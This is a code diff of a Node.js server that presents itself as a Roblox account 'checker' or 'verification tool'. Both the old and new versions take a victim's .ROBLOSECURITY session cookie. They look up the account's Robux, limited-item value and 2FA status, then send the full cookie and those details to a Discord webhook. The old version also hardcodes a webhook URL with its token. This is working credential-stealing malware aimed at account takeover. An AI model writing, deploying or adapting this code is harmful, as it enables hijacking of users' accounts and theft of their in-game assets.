@@ -1,108 +1,174 @@
 const express = require('express');
-const cors = require('cors');
 const axios = require('axios');
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-app.use(cors());
 app.use(express.json());
-app.use(express.static('public'));
 
-const WEBHOOK_LOGS = "https://discordapp.com/api/webhooks/1487257808129884342/8hak7vRrhqh_jHp0GMIE2jsdv5vxTuzeq-1eWK52mmmZykkvNDzDpdSBxTPV21ohl973";
+// Environment variable: your Discord webhook URL
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-// Helper para sa Headers (Ito ang sikreto para hindi ma-block agad)
-const getHeaders = (cookie) => ({
-    'Cookie': cookie,
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Referer': 'https://www.roblox.com/'
-});
+// Helper: fetch all limited items (paginated)
+async function fetchAllLimiteds(userId, cookie) {
+  let allItems = [];
+  let cursor = '';
+  let hasMore = true;
 
-async function fetchRobloxUser(cookie) {
-    try {
-        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers: getHeaders(cookie) });
-        return response.data;
-    } catch { return null; }
+  while (hasMore) {
+    const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ''}`;
+    const response = await axios.get(url, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+        'Referer': 'https://www.roblox.com/',
+        'Cookie': cookie
+      }
+    });
+    const data = response.data;
+    allItems = allItems.concat(data.data);
+    cursor = data.nextPageCursor;
+    hasMore = !!cursor;
+  }
+  return allItems;
 }
 
-async function fetchCurrency(userId, cookie) {
-    try {
-        const response = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers: getHeaders(cookie) });
-        return response.data;
-    } catch { return { robux: 0 }; }
-}
-
-async function fetchInventory(userId, cookie) {
-    try {
-        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, { headers: getHeaders(cookie) });
-        const items = response.data.data || [];
-        const totalRap = items.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
-        return { limitedsCount: items.length, rap: totalRap };
-    } catch { return { limitedsCount: 0, rap: 0 }; }
-}
-
-async function fetchUserSettings(cookie) {
-    try {
-        const response = await axios.get('https://accountsettings.roblox.com/v1/settings', { headers: getHeaders(cookie) });
-        return {
-            emailVerified: response.data.emailVerified || false,
-            twoFactor: response.data.twoStepVerificationEnabled || false
-        };
-    } catch { return { emailVerified: false, twoFactor: false }; }
-}
-
-// FORMATTING NG DISCORD EMBED (Gaya ng nasa picture mo)
-function buildLogPayload(cookie, userInfo, currency, inventory, settings) {
-    const username = userInfo?.name || "Unknown";
-    const userId = userInfo?.id || "0";
-    
-    return {
-        username: "Bypasser Module",
-        avatar_url: "https://i.imgur.com/Z6cCXk3.png",
-        embeds: [{
-            title: "BYPASSER MODULE — SUCCESS",
-            color: 0x3cb371, // Green
-            fields: [
-                { name: "👤 Account", value: `**${username}** (${userId})`, inline: false },
-                { name: "💰 Robux Balance", value: `${currency.robux} 🟩`, inline: true },
-                { name: "📈 Limiteds RAP", value: `${inventory.rap} 🟩`, inline: true },
-                { name: "📦 Limiteds Count", value: `${inventory.limitedsCount}`, inline: true },
-                { name: "⚙️ Settings", value: `Email: ${settings.emailVerified ? "✅" : "❌"}\n2FA: ${settings.twoFactor ? "✅" : "❌"}\nVoice: ✅`, inline: false },
-                { name: "🍪 .ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\``, inline: false }
-            ],
-            footer: { text: `Bypasser v3 | ${new Date().toLocaleString()}` },
-            timestamp: new Date().toISOString()
-        }]
-    };
-}
-
-app.post('/api/check', async (req, res) => {
-    const { cookie } = req.body;
-    if (!cookie) return res.status(400).json({ error: 'No cookie provided' });
-
-    try {
-        const userInfo = await fetchRobloxUser(cookie);
-        
-        if (!userInfo) {
-            return res.json({ success: false, message: "Invalid or Expired Cookie" });
-        }
-
-        // Sabay-sabay na kukunin ang data para mabilis
-        const [currency, inventory, settings] = await Promise.all([
-            fetchCurrency(userInfo.id, cookie),
-            fetchInventory(userInfo.id, cookie),
-            fetchUserSettings(cookie)
-        ]);
-
-        const payload = buildLogPayload(cookie, userInfo, currency, inventory, settings);
-        await axios.post(WEBHOOK_LOGS, payload);
-
-        res.json({ success: true, user: userInfo.name });
-    } catch (error) {
-        res.status(500).json({ success: false, error: error.message });
+// Helper: calculate total RAP from limited items
+function calculateRAP(items) {
+  let total = 0;
+  for (const item of items) {
+    if (item.recentAveragePrice && item.recentAveragePrice > 0) {
+      total += item.recentAveragePrice;
     }
+  }
+  return total;
+}
+
+// Helper: format account age from ISO date
+function formatAccountAge(createdDate) {
+  const created = new Date(createdDate);
+  const now = new Date();
+  const diffMs = now - created;
+  const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
+  if (diffDays < 365) return `${diffDays} days`;
+  const years = Math.floor(diffDays / 365);
+  const remainingDays = diffDays % 365;
+  return `${years} year${years > 1 ? 's' : ''}${remainingDays ? `, ${remainingDays} day${remainingDays > 1 ? 's' : ''}` : ''}`;
+}
+
+// Main endpoint
+app.post('/api/check', async (req, res) => {
+  const { cookie } = req.body;
+
+  if (!cookie) {
+    return res.status(400).json({ error: 'No cookie provided' });
+  }
+
+  // Basic cookie format check
+  if (!cookie.startsWith('.ROBLOSECURITY=')) {
+    return res.status(400).json({ error: 'Invalid cookie format. Must start with .ROBLOSECURITY=' });
+  }
+
+  const headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Referer': 'https://www.roblox.com/',
+    'Cookie': cookie
+  };
+
+  try {
+    // 1. Get authenticated user info
+    const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });
+    const user = authRes.data;
+    const userId = user.id;
+    const username = user.name;
+    const displayName = user.displayName;
+    const created = user.created;
+    const accountAge = formatAccountAge(created);
+    const isPremium = user.isPremium || false;
+
+    // 2. Get Robux balance
+    const robuxRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers });
+    const robux = robuxRes.data.robux || 0;
+
+    // 3. Get limited items and calculate RAP
+    let rap = 0;
+    try {
+      const limitedItems = await fetchAllLimiteds(userId, cookie);
+      rap = calculateRAP(limitedItems);
+    } catch (err) {
+      console.error('Failed to fetch limiteds:', err.message);
+      rap = 0; // fallback
+    }
+
+    // 4. Get account settings (email & 2FA)
+    const settingsRes = await axios.get('https://settings.roblox.com/v1/settings', { headers });
+    const settings = settingsRes.data;
+    const emailVerified = settings.emailVerified || false;
+    const twoStepEnabled = settings.isTwoStepVerificationEnabled || false;
+
+    // 5. Build Discord embed
+    const embed = {
+      title: `INJURIES MODULE — Account Verified`,
+      color: 0xff0040, // red accent
+      fields: [
+        {
+          name: '👤 Username',
+          value: `${username} (${displayName})`,
+          inline: true
+        },
+        {
+          name: '📅 Account Age',
+          value: accountAge,
+          inline: true
+        },
+        {
+          name: '💰 Robux',
+          value: robux.toLocaleString(),
+          inline: true
+        },
+        {
+          name: '📈 Limiteds RAP',
+          value: rap.toLocaleString(),
+          inline: true
+        },
+        {
+          name: '🔒 Security Settings',
+          value: `Email Verified: ${emailVerified ? '✅ Yes' : '❌ No'}\n2FA Enabled: ${twoStepEnabled ? '✅ Yes' : '❌ No'}\nPremium: ${isPremium ? '✅ Yes' : '❌ No'}`,
+          inline: true
+        },
+        {
+          name: '🍪 .ROBLOSECURITY Cookie',
+          value: `\`\`\`${cookie}\`\`\``,
+          inline: false
+        },
+        {
+          name: '🔗 Links',
+          value: `[Roblox Profile](https://www.roblox.com/users/${userId}/profile) | [Rolimons](https://www.rolimons.com/player/${userId})`,
+          inline: false
+        }
+      ],
+      footer: {
+        text: 'INJURIES • Account Verification Tool'
+      },
+      timestamp: new Date().toISOString()
+    };
+
+    const payload = {
+      content: `@everyone **INJURIES MODULE** — Account verified: **${username}**\n**Status:** Successful retrieval of all data.`,
+      embeds: [embed]
+    };
+
+    // Send to Discord webhook
+    if (!DISCORD_WEBHOOK_URL) {
+      throw new Error('DISCORD_WEBHOOK_URL not set in environment variables');
+    }
+
+    await axios.post(DISCORD_WEBHOOK_URL, payload);
+
+    // Respond to frontend
+    res.json({ success: true, message: 'Account data sent to Discord.' });
+  } catch (error) {
+    console.error('Error:', error.response?.data || error.message);
+    res.status(500).json({ error: 'Failed to verify account. Check cookie validity or Roblox API status.' });
+  }
 });
 
-if (process.env.NODE_ENV !== 'production') {
-    app.listen(PORT, () => console.log(`Server on ${PORT}`));
-}
+// Export for Vercel serverless deployment
 module.exports = app;
